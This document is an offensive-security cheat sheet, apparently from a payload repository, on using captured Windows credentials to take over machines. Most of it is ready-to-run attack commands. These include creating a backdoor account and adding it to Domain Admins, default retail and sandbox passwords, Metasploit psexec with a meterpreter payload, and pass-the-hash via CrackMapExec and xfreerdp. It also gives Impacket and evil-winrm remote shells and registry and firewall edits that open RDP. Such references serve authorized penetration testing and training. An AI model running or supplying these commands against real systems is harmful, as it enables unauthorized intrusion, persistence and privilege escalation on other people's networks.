# Windows - Using credentials

## Summary

* [TIPS](#tips)
    * [TIP 1 - Create your credential](#tip-1-create-your-credential)
    * [TIP 2 - Retail Credential](#tip-2-retail-credential)
    * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
* [Metasploit](#metasploit)
    * [Metasploit - SMB](#metasploit-smb)
    * [Metasploit - Psexec](#metasploit-psexec)
* [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
* [WinRM](#winrm)
* [Powershell Remoting](#powershell-remoting)
* [Crackmapexec](#crackmapexec)
* [Winexe](#winexe)
* [WMI](#wmi)
* [Psexec.py / Smbexec.py / Wmiexec.py](#psexecpy--smbexecpy--wmiexecpy)
* [PsExec - Sysinternal](#psexec-sysinternal)
* [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
* [Netuse](#netuse)
* [Runas](#runas)

## TIPS

### TIP 1 - Create your credential

```powershell
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add # RDP access
net localgroup "Backup Operators" hacker /add # Full access to files
net group "Domain Admins" hacker /add /domain
```

Some info about your user

```powershell
net user /dom
net user /domain
```

### TIP 2 - Retail Credential 

Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin

```powershell
Username: RetailAdmin
Password: trs10
```

### TIP 3 - Sandbox Credential - WDAGUtilityAccount

WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)

Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard

```powershell
\\windowssandbox
Username: wdagutilityaccount
Password: pw123
```


## Metasploit

### Metasploit - SMB

```c
use auxiliary/scanner/smb/smb_login  
set SMBDomain DOMAIN  
set SMBUser username
set SMBPass password
services -p 445 -R  
run
creds
```

### Metasploit - Psexec

Note: the password can be replaced by a hash to execute a `pass the hash` attack.

```c
use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser username
set SMBPass password
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

## Crackmapexec

```powershell
root@payload$ git clone https://github.com/byt3bl33d3r/CrackMapExec.github
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -x 'whoami' # cmd
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -X 'whoami' # powershell
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method atexec -x 'whoami'
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method wmiexec -x 'whoami'
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -x 'whoami'
```

## Remote Code Execution with PS Credentials

```powershell
PS C:\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
```

## WinRM

Require:
* Port **5985** or **5986** open.
* Default endpoint is **/wsman**

```powershell
root@payload$ git clone https://github.com/Hackplayers/evil-winrm
root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
root@payload$ evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

or using a custom ruby code to interact with the WinRM service.

```ruby
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://ip:5985/wsman',
  user: 'domain/user',
  password: 'password',
)

command=""
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```


## Powershell Remoting

> PSSESSION

```powershell
PS> Enable-PSRemoting

# one-to-one interactive session
PS> Enter-PSSession -computerName DC01
[DC01]: PS>

# one-to-one execute scripts and commands
PS> $Session = New-PSSession -ComputerName CLIENT1
PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
PS> Invoke-Command -Session $Session -scriptBlock { $test }
1

# one-to-many execute scripts and commands
PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
```


## Winexe 

Integrated to Kali

```powershell
root@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
```

## WMI

```powershell
PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
```

## Psexec.py / Smbexec.py / Wmiexec.py 

from Impacket

```powershell
root@payload$ git clone https://github.com/CoreSecurity/impacket.git

# PSEXEC like functionality example using RemComSv
root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10
# this will drop a binary on the disk = noisy

# A similar approach to PSEXEC w/o using RemComSvc
root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10

# A semi-interactive shell, used through Windows Management Instrumentation. 
root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10

# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10

# Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
root@payload$ python dcomexec.py DOMAIN/username:password@10.10.10.10
```

## PsExec - Sysinternal

from Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

```powershell
PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe

# switch admin user to NT Authority/System
PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
```

## RDP Remote Desktop Protocol 

Abuse RDP protocol to execute commands remotely with [SharpRDP](https://github.com/0xthirteen/SharpRDP)

```powershell
PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
```

Or connect remotely with `rdesktop`

```powershell
root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
root@payload$ rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
# -g : the screen will take up 70% of your actual screen size
# -r disk:share : sharing a local folder during a remote desktop session 
```

Note: you may need to enable it with the following command

```powershell
PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
PS C:\> netsh firewall set service remoteadmin enable
PS C:\> netsh firewall set service remotedesktop enable
```

or with psexec(sysinternals)

```powershell
PS C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
```

or with crackmapexec

```powershell
root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```

or with Metasploit

```powershell
root@payload$ run getgui -u admin -p 1234
```

or with xfreerdp 

```powershell
root@payload$ xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
root@payload$ xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129 # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
root@payload$ xfreerd /u:runner /v:10.0.0.1 # password will be asked
```

## Netuse 

Windows only

```powershell
PS C:\> net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
```

## Runas 

```powershell
PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
```


## References

- [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)